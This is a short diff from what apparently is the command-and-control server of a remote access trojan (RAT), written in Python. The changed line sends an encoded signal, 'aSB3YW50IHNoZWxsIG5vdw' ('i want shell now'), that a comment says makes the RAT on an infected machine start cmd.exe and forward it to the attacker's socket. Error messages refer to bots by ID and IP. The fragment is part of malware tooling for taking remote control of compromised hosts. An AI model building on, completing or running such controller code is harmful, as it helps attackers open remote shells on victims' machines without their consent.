@@ -117,7 +117,7 @@ class Handler(threading.Thread):
         # Initiate shell
 
         try:
-            self.client.send(("aSB3YW50IHNoZWxsIG5vdw").encode('utf-8'))             # Signals RAT to initiate cmd.exe process and forward fds to socket 
+            self.execute("aSB3YW50IHNoZWxsIG5vdw", True)             # Signals RAT to initiate cmd.exe process and forward fds to socket
         except Exception as ex:
             print(f"[* BotHandler-Msg:ShellExec] Unable to initiate shell with bot {self.bot_id} at {str(self.ip)}")
             print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
